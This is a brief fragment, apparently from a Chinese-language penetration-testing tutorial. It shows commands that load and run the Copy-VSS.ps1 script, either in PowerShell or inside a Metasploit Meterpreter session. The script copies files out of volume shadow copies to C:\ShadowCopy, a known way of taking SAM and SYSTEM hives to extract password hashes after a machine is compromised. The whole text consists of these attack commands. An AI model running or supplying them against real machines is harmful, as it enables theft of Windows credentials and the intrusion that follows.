	PS >Import-Module .\Copy-VSS.ps1
	PS >Copy-VSS
	PS >Copy-VSS -DestinationDir C:\ShadowCopy\
	或MSF中
	Meterpreter>load powershell
	Meterpreter>powershell_import /root/Copy-VSS.ps1
	Meterpreter>powershell_execute Copy-VSS